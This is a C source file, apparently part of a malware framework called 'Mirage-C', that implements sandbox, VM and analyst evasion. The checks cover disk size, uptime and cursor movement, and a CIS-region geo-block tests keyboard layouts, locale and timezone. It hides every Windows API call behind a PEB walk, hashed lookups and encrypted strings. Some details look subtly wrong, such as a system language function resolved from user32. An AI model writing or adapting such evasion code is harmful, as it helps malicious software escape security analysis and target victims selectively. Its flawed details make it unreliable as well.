/*
 * detection.c — VM/debugger/environment detection for Mirage-C
 *
 * Direct translation of Zig src/evasion/detection.zig.
 * All Win32 API calls are resolved through PEB walk + hash.
 */

#include "detection.h"
#include "evasion.h"
#include "engine.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "config.h"
#include "enc_strings.h"
#include <string.h>

#ifdef ENABLE_DETECTION

/* ── CIS language ID check ──────────────────────────────── */

static int is_cis_language(uint16_t lang_id) {
    uint16_t primary = lang_id & 0x3FF;
    switch (primary) {
        case 0x19: /* Russian */
        case 0x22: /* Belarusian */
        case 0x1C: /* Ukrainian */
        case 0x2B: /* Azerbaijani */
        case 0x1F: /* Kazakh */
        case 0x2C: /* Kyrgyz */
        case 0x29: /* Tajik */
        case 0x2E: /* Turkmen */
        case 0x2F: /* Uzbek */
        case 0x25: /* Tatar */
        case 0x28: /* Georgian */
        case 0x2A: /* Armenian */
        case 0x42: /* Chechen */
        case 0x43: /* Chuvash */
        case 0x37: /* Georgian (Mkhedruli) */
            return 1;
        default:
            return 0;
    }
}

/* ── Helper: resolve function from module by hash ────────── */

static void* resolve_func(void* mod, const char* name) {
    uint32_t h = mirage_encrypted_hash_func(name);
    return mirage_get_function_by_hash(mod, h);
}

/* ── Helper: load module by hash ─────────────────────────── */

static void* load_module(const char* name) {
    uint32_t h = mirage_encrypted_hash_module(name);
    return mirage_get_module_by_hash(h);
}

/* ── checkDiskSize ───────────────────────────────────────── */

int mirage_check_disk_size(void) {
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void* kernel32 = load_module(dll);
    if (!kernel32) return -1;

    /* GetDiskFreeSpaceExA */
    typedef BOOL (*fn_GetDiskFreeSpaceExA)(const char*, uint64_t*, uint64_t*, uint64_t*);
    char fn[32]; enc_decrypt(enc_GetDiskFreeSpaceExA, ENC_GETDISKFREESPACEEXA_LEN, fn);
    fn_GetDiskFreeSpaceExA pGetDiskFreeSpaceExA =
        (fn_GetDiskFreeSpaceExA)resolve_func(kernel32, fn);
    if (!pGetDiskFreeSpaceExA) return -1;

    uint64_t free_avail = 0;
    uint64_t total = 0;
    uint64_t total_free = 0;
    char path[] = "C:\\";
    if (!pGetDiskFreeSpaceExA(path, &free_avail, &total, &total_free))
        return -1;

    return (total / (1024ULL * 1024 * 1024)) < 60 ? 1 : 0;
}

/* ── checkUptime ─────────────────────────────────────────── */

int mirage_check_uptime(void) {
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void* kernel32 = load_module(dll);
    if (!kernel32) return -1;

    /* GetTickCount64 */
    typedef uint64_t (*fn_GetTickCount64)(void);
    char fn[32]; enc_decrypt(enc_GetTickCount64, ENC_GETTICKCOUNT64_LEN, fn);
    fn_GetTickCount64 pGetTickCount64 =
        (fn_GetTickCount64)resolve_func(kernel32, fn);
    if (!pGetTickCount64) return -1;

    uint64_t ms = pGetTickCount64();
    return (ms / (1000 * 60)) < 30 ? 1 : 0;
}

/* ── checkMouseMovement ──────────────────────────────────── */

int mirage_check_mouse_movement(void) {
    char dll[32]; enc_decrypt(enc_user32, ENC_USER32_LEN, dll);
    void* user32 = load_module(dll);
    if (!user32) return -1;

    typedef struct { long x; long y; } POINT;

    /* GetCursorPos */
    typedef BOOL (*fn_GetCursorPos)(POINT*);
    char fn[32]; enc_decrypt(enc_GetCursorPos, ENC_GETCURSORPOS_LEN, fn);
    fn_GetCursorPos pGetCursorPos =
        (fn_GetCursorPos)resolve_func(user32, fn);
    if (!pGetCursorPos) return -1;

    POINT p1;
    if (!pGetCursorPos(&p1)) return -1;

    /* Sleep 200ms via NtDelayExecution */
    LARGE_INTEGER interval;
    interval.QuadPart = -(200LL * 10000);
    mirage_NtDelayExecution(0, &interval);

    POINT p2;
    if (!pGetCursorPos(&p2)) return -1;

    return (p1.x == p2.x && p1.y == p2.y) ? 1 : 0;
}

/* ── checkGeoBlock ───────────────────────────────────────── */

mirage_geo_result mirage_check_geo_block(void) {
    mirage_geo_result result;
    memset(&result, 0, sizeof(result));

    char dll[32]; enc_decrypt(enc_user32, ENC_USER32_LEN, dll);
    void* user32 = load_module(dll);
    if (user32) {
        /* GetKeyboardLayoutList */
        typedef int (*fn_GetKeyboardLayoutList)(int, unsigned long*);
        char fn[32]; enc_decrypt(enc_GetKeyboardLayoutList, ENC_GETKEYBOARDLAYOUTLIST_LEN, fn);
        fn_GetKeyboardLayoutList pGetKeyboardLayoutList =
            (fn_GetKeyboardLayoutList)resolve_func(user32, fn);
        if (pGetKeyboardLayoutList) {
            unsigned long layouts[32];
            int count = pGetKeyboardLayoutList(32, layouts);
            if (count > 0) {
                for (int i = 0; i < count; i++) {
                    if (is_cis_language((uint16_t)(layouts[i] & 0xFFFF))) {
                        result.cis_keyboard = 1;
                        break;
                    }
                }
            }
        }

        /* GetSystemDefaultLangID */
        typedef uint16_t (*fn_GetSystemDefaultLangID)(void);
        enc_decrypt(enc_GetSystemDefaultLangID, ENC_GETSYSTEMDEFAULTLANGID_LEN, fn);
        fn_GetSystemDefaultLangID pGetLang =
            (fn_GetSystemDefaultLangID)resolve_func(user32, fn);
        if (pGetLang) {
            if (is_cis_language(pGetLang()))
                result.cis_locale = 1;
        }
    }

    char dll2[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll2);
    void* kernel32 = load_module(dll2);
    if (kernel32) {
        /* GetTimeZoneInformation */
        typedef struct {
            int32_t Bias;
            WCHAR StandardName[32];
            /* SYSTEMTIME omitted for brevity — we only need Bias */
        } TIME_ZONE_INFORMATION_LITE;

        typedef int (*fn_GetTimeZoneInformation)(TIME_ZONE_INFORMATION_LITE*);
        char fn2[32]; enc_decrypt(enc_GetTimeZoneInformation, ENC_GETTIMEZONEINFORMATION_LEN, fn2);
        fn_GetTimeZoneInformation pGetTzi =
            (fn_GetTimeZoneInformation)resolve_func(kernel32, fn2);
        if (pGetTzi) {
            TIME_ZONE_INFORMATION_LITE tzi;
            memset(&tzi, 0, sizeof(tzi));
            pGetTzi(&tzi);
            int bias_hours = -(tzi.Bias / 60);
            if (bias_hours >= 3 && bias_hours <= 12)
                result.cis_timezone = 1;
        }
    }

    if (result.cis_keyboard) result.matched++;
    if (result.cis_locale) result.matched++;
    if (result.cis_timezone) result.matched++;
    return result;
}

#endif /* ENABLE_DETECTION */
